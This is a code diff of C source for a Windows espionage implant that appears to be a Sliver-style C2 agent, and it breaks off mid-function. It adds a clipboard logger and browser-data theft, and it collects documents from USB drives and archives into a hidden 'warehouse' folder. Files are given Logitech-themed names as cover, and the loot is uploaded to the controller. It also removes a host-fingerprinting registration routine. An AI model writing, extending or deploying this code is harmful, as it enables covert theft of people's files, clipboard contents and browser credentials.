@@ -29,7 +29,7 @@ VOID FreeSliverThreadPool
 	}
 }
 
-PSLIVER_THREADPOOL InitializeSliverThreadPool(void)
+PSLIVER_THREADPOOL InitializeSliverThreadPool(VOID)
 {
 	PSLIVER_THREADPOOL pResult = NULL;
 	PTP_CLEANUP_GROUP pCleanupGroup = NULL;
@@ -61,8 +61,10 @@ VOID FreeGlobalConfig
 		FREE(pConfig->lpConfigID);
 		FREE(pConfig->lpServerMinisignPublicKey);
 		FREE(pConfig->lpPeerAgePublicKeySignature);
-		FREE(pConfig->lpScriptPath);
+		FREE(pConfig->lpSliverPath);
+		FREE(pConfig->lpMainExecutable);
 		FREE(pConfig->lpSliverName);
+		FREE(pConfig->lpUniqueName);
 		if (pConfig->hMutex != NULL) {
 			CloseHandle(pConfig->hMutex);
 		}
@@ -125,133 +127,6 @@ VOID FreeGlobalConfig
 		
 		FREE(pConfig);
 	}
-}
-
-PBUFFER RegisterSliver
-(
-	_In_ PGLOBAL_CONFIG pConfig
-)
-{
-	LPSTR lpUUID = NULL;
-	LPSTR lpFullQualifiedName = NULL;
-	LPSTR lpUserSid = NULL;
-	LPSTR lpGroupSid = NULL;
-	SYSTEM_INFO SystemInfo;
-	RTL_OSVERSIONINFOW OsVersion;
-	LPSTR lpVersion = NULL;
-	LPSTR lpHostName = NULL;
-	LPSTR lpArch = NULL;
-	LPSTR lpModulePath = NULL;
-	DWORD cbModulePath = MAX_PATH;
-	DWORD dwReturnedLength = 0;
-	DWORD dwLastError = 0;
-	LPSTR lpLocaleName = NULL;
-	WCHAR wszLocale[0x20];
-	PBUFFER pResult = NULL;
-	DWORD cbResult = 1;
-	CHAR szOsName[] = "windows";
-	PPBElement pFinalElement = NULL;
-	PPBElement ElementList[17];
-
-	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
-	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
-	SecureZeroMemory(ElementList, sizeof(ElementList));
-	lpUUID = GetHostUUID();
-	if (lpUUID == NULL) {
-		goto CLEANUP;
-	}
-
-	lpUUID[lstrlenA(lpUUID) - 1] = '\0';
-	lpFullQualifiedName = GetComputerUserName();
-	if (lpFullQualifiedName == NULL) {
-		goto CLEANUP;
-	}
-
-	lpUserSid = GetCurrentProcessUserSID();
-	if (lpUserSid == NULL) {
-		goto CLEANUP;
-	}
-
-	lpGroupSid = GetCurrentProcessGroupSID();
-	if (lpGroupSid == NULL) {
-		goto CLEANUP;
-	}
-
-	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
-	if (!GetOsVersion(&OsVersion)) {
-		LOG_ERROR("GetOsVersion", GetLastError());
-		goto CLEANUP;
-	}
-
-	GetNativeSystemInfo(&SystemInfo);
-	lpVersion = ALLOC(0x100);
-	wsprintfA(lpVersion, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
-	if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
-		lstrcatA(lpVersion, " x86_64");
-		lpArch = DuplicateStrA("amd64", 0);
-	}
-	else if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
-		lstrcatA(lpVersion, " x86");
-		lpArch = DuplicateStrA("386", 0);
-	}
-	else {
-		lpArch = DuplicateStrA("(NULL)", 0);
-	}
-
-	lpHostName = GetHostName();
-	lpModulePath = ALLOC(cbModulePath + 1);
-	while (TRUE) {
-		SecureZeroMemory(lpModulePath, cbModulePath + 1);
-		dwReturnedLength = GetModuleFileNameA(NULL, lpModulePath, cbModulePath);
-		dwLastError = GetLastError();
-		if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
-			cbModulePath *= 2;
-			lpModulePath = REALLOC(lpModulePath, cbModulePath + 1);
-		}
-
-		break;
-	}
-
-	GetSystemDefaultLocaleName(wszLocale, 0x20);
-	lpLocaleName = ConvertWcharToChar(wszLocale);
-	lpHostName = GetHostName();
-
-	ElementList[0] = CreateBytesElement(pConfig->lpSliverName, lstrlenA(pConfig->lpSliverName), 1);
-	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
-	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
-	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
-	ElementList[4] = CreateBytesElement(lpUserSid, lstrlenA(lpUserSid), 5);
-	ElementList[5] = CreateBytesElement(lpGroupSid, lstrlenA(lpGroupSid), 6);
-	ElementList[6] = CreateBytesElement(szOsName, lstrlenA(szOsName), 7);
-	ElementList[7] = CreateBytesElement(lpArch, lstrlenA(lpArch), 8);
-	ElementList[8] = CreateVarIntElement(GetCurrentProcessId(), 9);
-	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
-	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
-	ElementList[12] = CreateVarIntElement(pConfig->dwReconnectInterval, 13);
-	/*if (pSliverClient->HttpConfig.pProxyConfig != NULL && pSliverClient->HttpConfig.pProxyConfig->pUri != NULL) {
-		ElementList[13] = CreateBytesElement(pSliverClient->HttpConfig.pProxyConfig->pUri, lstrlenA(pSliverClient->HttpConfig.pProxyConfig->pUri), 14);
-	}*/
-
-	ElementList[14] = CreateBytesElement(pConfig->lpConfigID, lstrlenA(pConfig->lpConfigID), 16);
-	ElementList[15] = CreateVarIntElement(pConfig->uPeerID, 17);
-	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);
-
-	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
-	pResult = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
-	pFinalElement->pMarshaledData = NULL;
-CLEANUP:
-	FREE(lpHostName);
-	FREE(lpUUID);
-	FREE(lpFullQualifiedName);
-	FREE(lpUserSid);
-	FREE(lpGroupSid);
-	FREE(lpArch);
-	FREE(lpModulePath);
-	FREE(lpVersion);
-	FREE(lpLocaleName);
-	FreeElement(pFinalElement);
-
-	return pResult;
 }
 
 PBUFFER MarshalEnvelope
@@ -641,7 +516,7 @@ PSTANZA_WRAPPER ParseStanza
 	PBUFFER pDecodedData = NULL;
 
 	lpTemp = StrChrA(pInputBuffer, '\n');
-	dwPos = lpTemp - pInputBuffer + 1;
+	dwPos = (UINT64)lpTemp - (UINT64)pInputBuffer + 1;
 	memcpy(szLine, pInputBuffer, dwPos);
 	szLine[dwPos] = '\0';
 	if (lstrcmpA(szLine, "age-encryption.org/v1\n")) {
@@ -654,7 +529,7 @@ PSTANZA_WRAPPER ParseStanza
 		szLine[lstrlenA(szFooterPrefix)] = '\0';
 		if (IsStrStartsWithA(szLine, szFooterPrefix)) {
 			lpTemp = StrChrA(pInputBuffer + dwPos, '\n');
-			cchLine = lpTemp - pInputBuffer - dwPos + 1;
+			cchLine = (UINT64)lpTemp - (UINT64)pInputBuffer - dwPos + 1;
 			memcpy(szLine, pInputBuffer + dwPos, cchLine);
 			szLine[cchLine - 1] = '\0';
 			dwPos += cchLine;
@@ -675,7 +550,7 @@ PSTANZA_WRAPPER ParseStanza
 		}
 
 		lpTemp = StrChrA(pInputBuffer + dwPos, '\n');
-		cchLine = lpTemp - pInputBuffer - dwPos + 1;
+		cchLine = (UINT64)lpTemp - (UINT64)pInputBuffer - dwPos + 1;
 		memcpy(szLine, pInputBuffer + dwPos, cchLine);
 		szLine[cchLine - 1] = '\0';
 		dwPos += cchLine;
@@ -706,7 +581,7 @@ PSTANZA_WRAPPER ParseStanza
 		FREE(pArgs);
 		while (TRUE) {
 			lpTemp = StrChrA(pInputBuffer + dwPos, '\n');
-			cchLine = lpTemp - pInputBuffer - dwPos + 1;
+			cchLine = (UINT64)lpTemp - (UINT64)pInputBuffer - dwPos + 1;
 			memcpy(szLine, pInputBuffer + dwPos, cchLine);
 			szLine[cchLine - 1] = '\0';
 			dwPos += cchLine;
@@ -939,7 +814,7 @@ CLEANUP:
 	return pResult;
 }
 
-UINT64 GeneratePeerID()
+UINT64 GeneratePeerID(VOID)
 {
 	UINT64 uResult = 0;
 	PBYTE pRandomBytes = NULL;
@@ -956,7 +831,7 @@ VOID MarshalConfig
 	_In_ PGLOBAL_CONFIG pConfig
 )
 {
-	PPBElement ConfigElements[17];
+	PPBElement ConfigElements[18];
 	PPBElement DriveElements[10];
 	PPBElement* DriveList = NULL;
 	PPBElement HttpElements[12];
@@ -979,9 +854,9 @@ VOID MarshalConfig
 	ConfigElements[5] = CreateBytesElement(pConfig->lpConfigID, lstrlenA(pConfig->lpConfigID), 6);
 	ConfigElements[6] = CreateBytesElement(pConfig->lpPeerAgePublicKeySignature, lstrlenA(pConfig->lpPeerAgePublicKeySignature), 7);
 	ConfigElements[7] = CreateVarIntElement(pConfig->uEncoderNonce, 8);
-	ConfigElements[8] = CreateVarIntElement(pConfig->dwMaxFailure, 9);
+	ConfigElements[8] = CreateVarIntElement(pConfig->dwMaxConnectionErrors, 9);
 	ConfigElements[9] = CreateVarIntElement(pConfig->dwReconnectInterval, 10);
-	ConfigElements[10] = CreateBytesElement(pConfig->lpScriptPath, lstrlenA(pConfig->lpScriptPath), 11);
+	ConfigElements[10] = CreateBytesElement(pConfig->lpSliverPath, lstrlenA(pConfig->lpSliverPath), 11);
 	ConfigElements[11] = CreateVarIntElement(pConfig->Protocol, 12);
 	ConfigElements[12] = CreateVarIntElement(pConfig->Type, 13);
 
@@ -1083,6 +958,7 @@ VOID MarshalConfig
 	}
 
 	ConfigElements[16] = CreateVarIntElement(pConfig->Loot, 17);
+	ConfigElements[17] = CreateVarIntElement(pConfig->Clipboard, 18);
 	FinalElement = CreateStructElement(ConfigElements, _countof(ConfigElements), 0);
 	WriteToFile(pConfig->lpConfigPath, FinalElement->pMarshaledData, FinalElement->cbMarshaledData);
 	FreeElement(FinalElement);
@@ -1097,7 +973,7 @@ PGLOBAL_CONFIG UnmarshalConfig
 	DWORD cbMarshaledData = 0;
 	PGLOBAL_CONFIG pResult = NULL;
 	LPVOID* UnmarshaledData = NULL;
-	PPBElement ConfigElements[17];
+	PPBElement ConfigElements[18];
 	PPBElement DriveConfigElements[10];
 	PPBElement HttpConfigElements[12];
 	PPBElement PivotConfigElements[3];
@@ -1108,12 +984,14 @@ PGLOBAL_CONFIG UnmarshalConfig
 	PDRIVE_PROFILE pDriveProfile = NULL;
 	PHTTP_PROFILE pHttpProfile = NULL;
 	PPIVOT_PROFILE pPivotProfile = NULL;
+	LPWSTR lpTemp = NULL;
 
 	pMarshaledData = ReadFromFile(lpConfigPath, &cbMarshaledData);
 	if (pMarshaledData == NULL || cbMarshaledData == 0) {
 		goto CLEANUP;
 	}
 
+	Rc4EncryptDecrypt(pMarshaledData, cbMarshaledData, "config_key", lstrlenA("config_key"));
 	for (i = 0; i < _countof(ConfigElements); i++) {
 		ConfigElements[i] = ALLOC(sizeof(PBElement));
 		ConfigElements[i]->dwFieldIdx = i + 1;
@@ -1129,6 +1007,7 @@ PGLOBAL_CONFIG UnmarshalConfig
 	ConfigElements[14]->Type = RepeatedBytes;
 	ConfigElements[15]->Type = RepeatedBytes;
 	ConfigElements[16]->Type = Varint;
+	ConfigElements[17]->Type = Varint;
 	for (i = 0; i < _countof(DriveConfigElements); i++) {
 		DriveConfigElements[i] = ALLOC(sizeof(PBElement));
 		DriveConfigElements[i]->dwFieldIdx = i + 1;
@@ -1203,17 +1082,23 @@ PGLOBAL_CONFIG UnmarshalConfig
 		UnmarshaledData[6] = NULL;
 	}
 
-	pResult->uEncoderNonce = UnmarshaledData[7];
-	pResult->dwMaxFailure = UnmarshaledData[8];
-	pResult->dwReconnectInterval = UnmarshaledData[9];
+	pResult->uEncoderNonce = (UINT64)UnmarshaledData[7];
+	pResult->dwMaxConnectionErrors = (DWORD)UnmarshaledData[8];
+	pResult->dwReconnectInterval = (DWORD)UnmarshaledData[9];
 	if (UnmarshaledData[10] != NULL) {
-		pResult->lpScriptPath = DuplicateStrA(((PBUFFER)UnmarshaledData[10])->pBuffer, 0);
+		lpTemp = ConvertCharToWchar(((PBUFFER)UnmarshaledData[10])->pBuffer);
+		pResult->lpSliverPath = ALLOC(MAX_PATH * sizeof(WCHAR));
+		ExpandEnvironmentStringsW(lpTemp, pResult->lpSliverPath, MAX_PATH);
 		FreeBuffer(UnmarshaledData[10]);
 		UnmarshaledData[10] = NULL;
 	}
 
 	if (UnmarshaledData[16] != NULL) {
 		pResult->Loot = TRUE;
+	}
+
+	if (UnmarshaledData[17] != NULL) {
+		pResult->Clipboard = TRUE;
 	}
 
 	pResult->Type = (ImplantType)UnmarshaledData[12];
@@ -1272,7 +1157,7 @@ PGLOBAL_CONFIG UnmarshalConfig
 						FreeBuffer(pTemp2[8]);
 					}
 					
-					pDriveProfile->dwPollInterval = pTemp2[9];
+					pDriveProfile->dwPollInterval = (DWORD)pTemp2[9];
 					pResult->DriveProfiles[i] = pDriveProfile;
 					FREE(pTemp2);
 				}
@@ -1381,9 +1266,9 @@ PGLOBAL_CONFIG UnmarshalConfig
 						FreeBuffer(pTemp2[7]);
 					}
 
-					pHttpProfile->dwMinNumberOfSegments = pTemp2[8];
-					pHttpProfile->dwMaxNumberOfSegments = pTemp2[9];
-					pHttpProfile->dwPollInterval = pTemp2[10];
+					pHttpProfile->dwMinNumberOfSegments = (DWORD)pTemp2[8];
+					pHttpProfile->dwMaxNumberOfSegments = (DWORD)pTemp2[9];
+					pHttpProfile->dwPollInterval = (DWORD)pTemp2[10];
 					if (pTemp2[11] != NULL) {
 						pHttpProfile->lpUrl = DuplicateStrA(((PBUFFER)pTemp2[11])->pBuffer, 0);
 						FreeBuffer(pTemp2[11]);
@@ -1425,7 +1310,10 @@ PGLOBAL_CONFIG UnmarshalConfig
 		FREE(UnmarshaledData[15]);
 	}
 
+	pResult->lpConfigPath = DuplicateStrW(lpConfigPath, 0);
+
 CLEANUP:
+	FREE(lpTemp);
 	FREE(pMarshaledData);
 	FREE(UnmarshaledData);
 	for (i = 0; i < _countof(ConfigElements); i++) {
@@ -1550,8 +1438,6 @@ VOID CopyFileToWarehouse
 	LPWSTR lpWarehouse = NULL;
 	PBYTE pFileData = NULL;
 	DWORD cbFileData = 0;
-	LPWSTR lpFileName = NULL;
-	LPSTR lpTemp = NULL;
 	PBYTE pNameDigest = NULL;
 	LPWSTR lpNameHexDigest = NULL;
 	WCHAR wszDriveName[] = L"A:\\";
@@ -1560,17 +1446,14 @@ VOID CopyFileToWarehouse
 	DWORD dwNumberOfFreeClusters = 0;
 	DWORD dwTotalNumberOfClusters = 0;
 	UINT64 uPercentFull = 0;
-	HANDLE hFile = INVALID_HANDLE_VALUE;
 	DWORD dwFileSize = 0;
 	FILETIME CreationTime;
 	FILETIME LastAccessTime;
 	FILETIME LastWriteTime;
 	LPSTR lpConvertedPath = NULL;
-	SYSTEMTIME CreationSystemTime;
-	SYSTEMTIME LastAccessSystemTime;
-	SYSTEMTIME LastWriteSystemTime;
 	PBYTE pPlainText = NULL;
 	DWORD cbPlainText = 0;
+	HANDLE hFile = INVALID_HANDLE_VALUE;
 
 	hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
@@ -1583,7 +1466,6 @@ VOID CopyFileToWarehouse
 	}
 
 	CloseHandle(hFile);
-	PrintFormatW(L"%s\n", lpPath);
 	lpWarehouse = DuplicateStrW(pConfig->wszWarehouse, SHA256_HASH_SIZE + 0x10);
 	if (!IsFolderExist(lpWarehouse)) {
 		if (!CreateDirectoryW(lpWarehouse, NULL)) {
@@ -1614,30 +1496,28 @@ VOID CopyFileToWarehouse
 		goto CLEANUP;
 	}
 
-	pPlainText = ALLOC(0x200 + cbFileData);
 	lpConvertedPath = ConvertWcharToChar(lpPath);
-	FileTimeToSystemTime(&CreationTime, &CreationSystemTime);
-	FileTimeToSystemTime(&LastAccessTime, &LastAccessSystemTime);
-	FileTimeToSystemTime(&LastWriteTime, &LastWriteSystemTime);
-	wsprintfA(pPlainText, "Session/Beacon ID: %s\nFile path: %s\nCreation time: %d/%d/%d %d:%d:%d\nLast access time: %d/%d/%d %d:%d:%d\nLast write time: %d/%d/%d %d:%d:%d", pConfig->szSessionID, lpConvertedPath, CreationSystemTime.wDay, CreationSystemTime.wMonth, CreationSystemTime.wYear, CreationSystemTime.wHour, CreationSystemTime.wMinute, CreationSystemTime.wSecond, LastAccessSystemTime.wDay, LastAccessSystemTime.wMonth, LastAccessSystemTime.wYear, LastAccessSystemTime.wHour, LastAccessSystemTime.wMinute, LastAccessSystemTime.wSecond, LastWriteSystemTime.wDay, LastWriteSystemTime.wMonth, LastWriteSystemTime.wYear, LastWriteSystemTime.wHour, LastWriteSystemTime.wMinute, LastWriteSystemTime.wSecond);
-	memcpy(&pPlainText[0x200], pFileData, cbFileData);
-	lpFileName = PathFindFileNameW(lpPath);
-	lpTemp = ConvertWcharToChar(lpFileName);
-	pNameDigest = ComputeSHA256(lpTemp, lstrlenA(lpTemp));
+	cbPlainText = lstrlenA(lpConvertedPath) + 1 + cbFileData;
+	pPlainText = ALLOC(cbPlainText);
+	lstrcpyA(pPlainText, lpConvertedPath);
+	memcpy(&pPlainText[lstrlenA(lpConvertedPath) + 1], pFileData, cbFileData);
+	pNameDigest = ComputeSHA256(lpConvertedPath, lstrlenA(lpConvertedPath));
 	lpNameHexDigest = ConvertBytesToHexW(pNameDigest, SHA256_HASH_SIZE);
 	lpNameHexDigest[SHA256_HASH_SIZE] = L'\0';
 	lstrcatW(lpWarehouse, L"\\");
 	lstrcatW(lpWarehouse, lpNameHexDigest);
-	if (!WriteToFile(lpWarehouse, pPlainText, cbFileData + 0x200)) {
+	if (!WriteToFile(lpWarehouse, pPlainText, cbPlainText)) {
 		goto CLEANUP;
 	}
 
+	hFile = CreateFileW(lpWarehouse, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	SetFileTime(hFile, &CreationTime, &LastAccessTime, &LastWriteTime);
+	CloseHandle(hFile);
 CLEANUP:
 	FREE(lpConvertedPath);
 	FREE(lpWarehouse);
 	FREE(pFileData);
 	FREE(pPlainText);
-	FREE(lpTemp);
 	FREE(pNameDigest);
 	FREE(lpNameHexDigest);
 }
@@ -1653,15 +1533,15 @@ BOOL StealFile
 	DWORD k = 0;
 	LPWSTR lpExtension = NULL;
 	LPWSTR lpExtension2 = NULL;
-	PITEM_INFO* ItemList = NULL;
+	PARCHIVE_INFO pArchiveInfo = NULL;
 	PITEM_INFO pItem = NULL;
-	DWORD dwNumberOfItems = 0;
 	HANDLE hFile = INVALID_HANDLE_VALUE;
 	DWORD dwFileSize = 0;
 	BOOL IsUsb = FALSE;
 	PGLOBAL_CONFIG pConfig = NULL;
 	FILETIME LastWriteTime;
 	BOOL Result = FALSE;
+	LPWSTR lpBit7zPath = NULL;
 
 	IsUsb = (BOOL)Args[0];
 	pConfig = (PGLOBAL_CONFIG)Args[1];
@@ -1686,49 +1566,50 @@ BOOL StealFile
 	}
 
 	dwFileSize = GetFileSize(hFile, NULL);
+	CloseHandle(hFile);
+	hFile = NULL;
+	if (dwFileSize > 100000000) {
+		goto CLEANUP;
+	}
+
 	lpExtension = PathFindExtensionW(lpPath);
 	if (lpExtension[0] != L'\0') {
 		for (i = 0; i < pConfig->cDocumentExtensions; i++) {
 			if (!lstrcmpW(lpExtension, pConfig->DocumentExtensions[i])) {
-				if (dwFileSize > 500000000) {
-					goto CLEANUP;
-				}
-
 				CopyFileToWarehouse(lpPath, pConfig);
 				goto CLEANUP;
 			}
 		}
 
-		for (i = 0; i < pConfig->cArchiveExtensions; i++) {
-			if (!lstrcmpW(lpExtension, pConfig->ArchiveExtensions[i])) {
-				if (dwFileSize > 100000000) {
-					break;
-				}
-
-				PrintFormatW(L"Zip path: %s\n", lpPath);
-				ItemList = ExtractFromZip(lpPath, NULL, FALSE, &dwNumberOfItems);
-				if (ItemList == NULL) {
-					continue;
-				}
-
-				for (j = 0; j < dwNumberOfItems; j++) {
-					pItem = ItemList[j];
-					if (pItem == NULL || pItem->pFileData == NULL) {
-						continue;
+		lpBit7zPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(L"\\LogitechLcd.dll"));
+		lstrcatW(lpBit7zPath, L"\\LogitechLcd.dll");
+		if (IsFileExist(lpBit7zPath)) {
+			for (i = 0; i < pConfig->cArchiveExtensions; i++) {
+				if (!lstrcmpW(lpExtension, pConfig->ArchiveExtensions[i])) {
+					pArchiveInfo = Bit7zGetInfo(lpBit7zPath, lpPath);
+					if (pArchiveInfo == NULL) {
+						break;
 					}
 
-					lpExtension2 = PathFindExtensionW(pItem->lpPath);
-					if (lpExtension2[0] != L'\0') {
-						for (k = 0; k < pConfig->cDocumentExtensions; k++) {
-							if (!lstrcmpW(lpExtension2, pConfig->DocumentExtensions[k])) {
-								CopyFileToWarehouse(lpPath, pConfig);
-								goto CLEANUP;
+					for (j = 0; j < pArchiveInfo->dwNumberOfItems; j++) {
+						pItem = pArchiveInfo->ItemList[j];
+						if (pItem == NULL) {
+							continue;
+						}
+
+						lpExtension2 = PathFindExtensionW(pItem->lpPath);
+						if (lpExtension2[0] != L'\0') {
+							for (k = 0; k < pConfig->cDocumentExtensions; k++) {
+								if (!lstrcmpW(lpExtension2, pConfig->DocumentExtensions[k])) {
+									CopyFileToWarehouse(lpPath, pConfig);
+									goto CLEANUP;
+								}
 							}
 						}
 					}
-				}
 
-				break;
+					break;
+				}
 			}
 		}
 	}
@@ -1738,15 +1619,90 @@ CLEANUP:
 		CloseHandle(hFile);
 	}
 
-	if (ItemList != NULL) {
+	FreeArchiveInfo(pArchiveInfo);
+	FREE(lpBit7zPath);
+	/*if (ItemList != NULL) {
 		for (j = 0; j < dwNumberOfItems; j++) {
 			FreeItemInfo(ItemList[j]);
 		}
 
 		FREE(ItemList);
-	}
+	}*/
 
 	return Result;
+}
+
+VOID StealClipboard
+(
+	_In_ PGLOBAL_CONFIG pConfig
+)
+{
+	HANDLE hClipboard = NULL;
+	LPWSTR lpMessage = NULL;
+	HWND hWindow = NULL;
+	MSG Message;
+	LPWSTR lpClipboardPath = NULL;
+	LPSTR lpTemp = NULL;
+	SYSTEMTIME SystemTime;
+	CHAR szTemp[0x40];
+
+	lpClipboardPath = DuplicateStrW(pConfig->wszWarehouse, 0x20);
+	if (!IsFolderExist(lpClipboardPath)) {
+		if (!CreateDirectoryW(lpClipboardPath, NULL)) {
+			LOG_ERROR("CreateDirectoryW", GetLastError());
+			goto CLEANUP;
+		}
+
+		if (!SetFileAttributesW(lpClipboardPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
+			LOG_ERROR("SetFileAttributesW", GetLastError());
+			goto CLEANUP;
+		}
+	}
+
+	lstrcatW(lpClipboardPath, L"\\logitech_series.txt");
+	hWindow = CreateWindowExW(0, L"Edit", L"Sample Window", WS_MINIMIZE | WS_OVERLAPPED, 100, 100, 100, 100, NULL, NULL, NULL, NULL);
+	if (hWindow == NULL) {
+		LOG_ERROR("CreateWindowExW", GetLastError());
+		goto CLEANUP;
+	}
+
+	if (!AddClipboardFormatListener(hWindow)) {
+		LOG_ERROR("AddClipboardFormatListener", GetLastError());
+		goto CLEANUP;
+	}
+
+	while (TRUE) {
+		SecureZeroMemory(&Message, sizeof(Message));
+		if (GetMessageW(&Message, hWindow, WM_CLIPBOARDUPDATE, WM_CLIPBOARDUPDATE)) {
+			if (Message.message == WM_CLIPBOARDUPDATE) {
+				if (OpenClipboard(NULL)) {
+					hClipboard = GetClipboardData(CF_UNICODETEXT);
+					if (hClipboard != NULL) {
+						lpMessage = (LPWSTR)GlobalLock(hClipboard);
+						lpTemp = ConvertWcharToChar(lpMessage);
+						GetSystemTime(&SystemTime);
+						wsprintfA(szTemp, "[%d/%d/%d %d:%d:%d]\n", SystemTime.wDay, SystemTime.wMonth, SystemTime.wYear, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond);
+						lpTemp = StrInsertBeforeA(lpTemp, szTemp);
+						lpTemp = StrCatExA(lpTemp, "\n");
+						AppendToFile(lpClipboardPath, lpTemp, lstrlenA(lpTemp));
+						FREE(lpTemp);
+					}
+
+					CloseClipboard();
+				}
+			}
+		}
+
+		Sleep(1000);
+	}
+
+CLEANUP:
+	FREE(lpClipboardPath);
+	if (hWindow != NULL) {
+		DestroyWindow(hWindow);
+	}
+
+	return;
 }
 
 BOOL LootFileCallback
@@ -1769,7 +1725,7 @@ VOID LootFileThread
 	_In_ PLOOT_ARGS pParateter
 )
 {
-	WatchFileModificationEx(pParateter->lpPath, TRUE, LootFileCallback, pParateter->pConfig);
+	WatchFileModificationEx(pParateter->lpPath, TRUE, (FILE_MODIFICATION_CALLBACK)LootFileCallback, pParateter->pConfig);
 CLEANUP:
 	if (pParateter != NULL) {
 		FREE(pParateter->lpPath);
@@ -1808,9 +1764,9 @@ VOID MonitorUsbCallback
 
 	lpDeviceID = SearchMatchStrW(lpInput, L"DeviceID = \"", L"\";\n");
 	lpDeviceID = StrCatExW(lpDeviceID, L"\\");
-	Args[0] = TRUE;
+	((PBOOL)Args)[0] = TRUE;
 	Args[1] = pConfig;
-	ListFileEx(lpDeviceID, LIST_RECURSIVELY | LIST_JUST_FILE, StealFile, Args);
+	ListFileEx(lpDeviceID, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, Args);
 CLEANUP:
 	FREE(lpDeviceID);
 }
@@ -1821,7 +1777,7 @@ VOID MonitorUsb
 )
 {
 	while (TRUE) {
-		RegisterAsyncEvent(L"Select * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_LogicalDisk'", MonitorUsbCallback, pConfig);
+		RegisterAsyncEvent(L"Select * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogicalDisk'", (EVENTSINK_CALLBACK)MonitorUsbCallback, pConfig);
 		Sleep(60000);
 	}
 }
@@ -1886,34 +1842,81 @@ VOID LootFile
 	}
 }
 
+VOID LootBrowserData
+(
+	_In_ PGLOBAL_CONFIG pConfig
+)
+{
+	PENVELOPE pBrowserData = NULL;
+	LPWSTR lpDestPath = NULL;
+	LPWSTR lpLastLootTime = NULL;
+	PUINT64 pLastLootTime = NULL;
+	FILETIME CurrentTime;
+
+	lpDestPath = DuplicateStrW(pConfig->wszWarehouse, 0);
+	if (!IsFolderExist(lpDestPath)) {
+		if (!CreateDirectoryW(lpDestPath, NULL)) {
+			LOG_ERROR("CreateDirectoryW", GetLastError());
+			goto CLEANUP;
+		}
+
+		if (!SetFileAttributesW(lpDestPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
+			LOG_ERROR("SetFileAttributesW", GetLastError());
+			goto CLEANUP;
+		}
+	}
+
+	lpLastLootTime = StrAppendW(lpDestPath, L"\\last.txt");
+	lpDestPath = StrCatExW(lpDestPath, L"\\MxErgo.dat");
+	if (IsFileExist(lpLastLootTime)) {
+		pLastLootTime = (PUINT64)ReadFromFile(lpLastLootTime, NULL);
+		GetSystemTimeAsFileTime(&CurrentTime);
+		if ((UINT64)((((UINT64)CurrentTime.dwHighDateTime) << 32) + CurrentTime.dwLowDateTime) - (*pLastLootTime) <= 8640000000000) {
+			goto CLEANUP;
+		}
+	}
+	else {
+		pLastLootTime = ALLOC(sizeof(UINT64));
+	}
+
+	*pLastLootTime = (UINT64)((((UINT64)CurrentTime.dwHighDateTime) << 32) + CurrentTime.dwLowDateTime);
+	WriteToFile(lpLastLootTime, pLastLootTime, sizeof(UINT64));
+	pBrowserData = BrowserHandler(NULL);
+	if (pBrowserData == NULL) {
+		goto CLEANUP;
+	}
+
+	if (!WriteToFile(lpDestPath, pBrowserData->pData->pBuffer, pBrowserData->pData->cbBuffer)) {
+		goto CLEANUP;
+	}
+
+CLEANUP:
+	FREE(lpLastLootTime);
+	FREE(pLastLootTime);
+	FREE(lpDestPath);
+	FreeEnvelope(pBrowserData);
+
+	return;
+}
+
 BOOL UploadLootedFileCallback
 (
 	_In_ LPWSTR lpPath,
 	_In_ PSLIVER_SESSION_CLIENT pSession
 )
 {
-	ENVELOPE Envelope;
-	PBYTE pFileData = NULL;
-	DWORD cbFileData = 0;
+	PENVELOPE pEnvelope = NULL;
 
-	SecureZeroMemory(&Envelope, sizeof(Envelope));
-	Envelope.uType = MsgLootFile;
-	pFileData = ReadFromFile(lpPath, &cbFileData);
-	if (pFileData == NULL) {
+	pEnvelope = MarshalLootedFile(lpPath);
+	if (pEnvelope == NULL) {
 		goto CLEANUP;
 	}
 
-	if (!DeleteFileW(lpPath)) {
-		LOG_ERROR("DeleteFileW", GetLastError());
-		goto CLEANUP;
-	}
-
-	Envelope.pData = BufferMove(pFileData, cbFileData);
-	pFileData = NULL;
-	pSession->Send(pSession->pGlobalConfig, pSession->lpClient, &Envelope);
+	pSession->Send(pSession->pGlobalConfig, pSession->lpClient, pEnvelope);
 	Sleep(500);
 CLEANUP:
-	FreeBuffer(Envelope.pData);
+	FreeEnvelope(pEnvelope);
+
 	return FALSE;
 }
 
@@ -1940,9 +1943,97 @@ VOID SliverUploadLootedFile
 	}
 
 	while (TRUE) {
-		ListFileEx(lpWarehouse, LIST_JUST_FILE, UploadLootedFileCallback, pSession);
+		ListFileEx(lpWarehouse, LIST_JUST_FILE, (LIST_FILE_CALLBACK)UploadLootedFileCallback, pSession);
 		Sleep(60000);
 	}
+
 CLEANUP:
 	return;
+}
+
+PENVELOPE MarshalLootedFile
+(
+	_In_ LPWSTR lpFilePath
+)
+{
